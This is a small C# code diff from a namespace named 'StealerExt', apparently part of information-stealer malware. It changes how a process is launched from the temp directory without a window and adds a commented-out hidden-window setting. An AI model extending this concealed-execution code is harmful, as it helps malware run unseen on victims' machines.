@@ -18,7 +18,8 @@ namespace StealerExt
 				{
 					UseShellExecute = true,
 					WorkingDirectory = Path.GetTempPath(),
-					CreateNoWindow = true
+					CreateNoWindow = true,
+					//WindowStyle = ProcessWindowStyle.Hidden,
 				}
 			};
 			cli.Start();
